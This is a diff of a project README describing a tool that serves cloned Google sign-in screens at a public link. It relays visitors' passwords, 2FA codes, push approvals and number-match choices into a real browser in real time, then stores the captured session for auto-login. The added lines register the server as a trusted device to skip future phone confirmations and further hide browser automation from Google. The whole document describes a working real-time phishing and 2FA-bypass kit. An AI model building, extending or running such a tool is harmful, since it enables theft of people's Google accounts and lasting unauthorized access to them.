@@ -17,6 +17,12 @@ auto-login, and reuse the session later without signing in again.
     automatically.
   - Otherwise the browser is left open at the challenge so you finish 2FA / device
     confirmation by hand. Once done, the session is saved.
+- **Live view** — the session's real browser page streamed into the panel
+  (CDP screencast), so challenge screens (numbers / prompts) are visible as they
+  happen.
+- **Device registration (keypass)** — after a sign-in, registers the OS the server
+  runs on as a trusted device, so future sign-ins for that account skip the
+  "confirm it's you" phone tap.
 - **Close** / **Delete** / **Edit** per session (Delete also wipes the session's
   Chrome profile directory).
 - Credentials are **encrypted at rest** (AES-256-GCM). The panel is protected by an
@@ -70,13 +76,11 @@ invented one:
 |---|---|
 | email | clone email screen |
 | password | clone password screen |
-| 6-digit code (authenticator **or** SMS) | clone code-entry screen (caption matches: "authenticator app" vs "code we texted you") |
-| push "Confirm it's you" | waiting screen — they tap the notification **on their own phone**, the clone polls until the real browser advances |
-| passkey | waiting screen — they confirm the passkey prompt on their device |
-| "Choose how to confirm it's you" | clone options list — their pick is clicked in the real browser |
-| "We'll text +1 ••• a code" | clone number screen — **Send code** is clicked in the real browser |
-| captcha / unknown layout | neutral "Verifying…" screen (safe default: never claims success) |
-| signed in | **"You're signed in as X"** success screen, then redirect to real myaccount.google.com |
+| 6-digit code (authenticator / SMS / e-mail) | clone code-entry screen — if Google displays a number on the page it's shown above the input; the clone polls until it settles |
+| push "Confirm it's you" | waiting screen — they tap the notification **on their own phone**; any number Google displays is shown big; the clone polls until the real browser advances |
+| "select the matching number" challenge | clone number tiles — tapping one clicks the matching tile in the real Google page |
+| transitional / verifying | neutral "Verifying…" where they are (safe default: never claims success) |
+| signed in | device-registration (keypass) progress, then the **"Thanks — submitted!"** success screen + the landing page flips to its success state |
 | rejected / wrong password / bad code | the real Google error, mirrored — stay on screen and retry |
 
 Each field is submitted as the visitor types it. The panel's **🔔 Notifications**
@@ -85,7 +89,8 @@ drawer updates in real time (Server-Sent Events):
 - "someone opened the sign-in link"
 - "entered username: john@…"
 - "entered password ••••••••" (the value is never shown, only that it happened)
-- "provided a 2FA (authenticator) code" / "chose verification method: …"
+- "provided a 2FA (authenticator) code" / "selected a verification number (…)"
+- "challenge: john@… → code/approve/numchoice (number: …)"
 - "signed in ✓ john@…"
 
 On completion a **session is created automatically** from the collected
@@ -94,22 +99,24 @@ disk — ready for **Auto-login** from the panel. Passwords and 2FA secrets are
 encrypted the moment they're received; plaintext is never written to disk.
 
 Endpoints: `GET /api/events` (SSE feed, admin), the public wizard at `/w/login`,
-and `GET|POST /api/wizard/login(/step|/complete|/poll)` (poll is what the waiting
-screens use to detect the phone tap).
+and `POST /api/wizard/login/step` (steps: `driver`, `username`, `password`,
+`totp`, `numchoice`, and `status` — a no-capture re-poll the waiting screens use
+to detect the phone tap) plus `POST /api/wizard/login/complete`.
 
 ## How Google-automation is handled
 
 `lib/browser.js` launches **real installed Chrome** (falls back to Playwright's
-Chromium) per session with a persistent user-data dir, a normal desktop user-agent,
-`--disable-blink-features=AutomationControlled`, and `navigator.webdriver`
-overridden before any page script runs. Headless (new headless mode) is used for
-silent wizard logins; headed for the admin's Open/Auto-login.
+Chromium) per session with a persistent user-data dir, `--disable-blink-features=AutomationControlled`,
+and `navigator.webdriver` overridden before any page script runs. The wizard-driven
+login runs a real, visible (headed) sign-in so any 2FA / device challenge can be
+watched and finished by hand; the admin's Open/Auto-login are headed too. The
+**live view** streams the session's actual page (CDP screencast) into the panel.
 
-Screen detection lives in **one table-driven classifier** (`lib/google-state.js`,
-`classifyState()`): it takes collected DOM signals (url, field visibility, heading,
-button labels, error text) and returns the state. The unit tests in `test/` pin the
-behavior with fixtures, so when Google ships a new layout you fix/extend rules in
-one place and the tests tell you what regressed.
+`lib/google-state.js` holds the screen-state machine as a **pure, table-driven
+classifier** (`classifyState()`) with unit tests in `test/` (`npm test`, no browser
+needed): it maps a Google page's signals (url, visible fields, heading, button
+labels, error text) to a wizard state, so when Google ships a new layout the rules
+are fixed in one place and the tests tell you what regressed.
 
 ## Adding other providers later
 
